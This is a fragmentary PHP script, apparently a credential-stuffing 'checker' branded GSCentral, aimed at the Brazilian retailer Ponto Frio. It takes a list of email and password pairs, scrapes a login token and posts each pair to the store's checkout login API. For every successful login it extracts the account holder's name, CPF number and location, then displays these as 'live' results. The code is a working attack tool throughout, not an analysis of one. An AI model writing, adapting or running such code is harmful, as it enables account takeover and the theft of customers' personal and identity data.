...
class cURL {
    ...
    'Content-Type: application/json; charset=UTF-8'));
        ...
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/PONTO FRIO.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/PONTO FRIO.txt');
		curl_setopt($ch, CURLOPT_REFERER, 0);
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clienteLogin":{"Token":"'.$token.'","Operador":"","IdUnidadeNegocio":5,"Senha":"'.$pwd.'","cadastro":"on","Email":"'.$email.'"},"mesclarCarrinho":true,"Token":"'.$token.'","IdUnidadeNegocio":5,"Operador":""}');
        }
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data) {
...
<title>GSCentral - PONTOFRIO</title>
...
<br>
<H1><center>PONTOFRIO</h1><h4>GSCentral</h4>
...
if (isset($_POST['btn-submit'])) {
    ...
    ;
    echo '<br/>
<p style="background: #54bd0e; padding: 6px 20px; width: 180px; font-size: 13px; border-radius: 15px; color: #F0F0F0;">Lista Carregada ('.$emais.') </p>
...
if(file_exists(getcwd().'/dafiti.txt')) {
	...
	//CHAMADAS DE TOKEN E POST
 	$a = new cURL();
    $b = $a->get("https://carrinho.pontofrio.com.br/Checkout?ReturnUrl=http://www.pontofrio.com.br#login");
    $token = getStr($b,'var token = "','"');
	$c = new cURL();
    $d = $c->post("https://carrinho.pontofrio.com.br/Api/checkout/Cliente.svc/Cliente/Login");
$checked++;
	...
	//RESULTADOS DE CAPUTRA
		if (stristr($d,'"Erro":false') !== false) {
             $cidade = getStr($d,'"Bairro":"','",');
			$estado = getStr($d,'"Estado":"','",');
            $cpf = getStr($d,'"Cpf":"','",');
            $nome = getStr($d,'"NomeCompleto":"','",');
			$xyz = "<center><H4><b style=\"color:green\">✔ </b>$email | $pwd | <b>Nome:</b> <b style=\"color:green\"> $nome </b>| <b>CPF:</b> <b style=\"color:green\"> $cpf </b>| <b>Cidade/Estado:</b> <b style=\"color:green\"></b><b style=\"color:green\"> $cidade/$estado </b> <b style=\"color:green\">| #GSCheckers </b></h4></center>";
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);
				...
				pushPaypalDie("<h4><b style=\"color:red\">✘ </b>$email|$pwd </h4>");
			unset($emails[$k]);
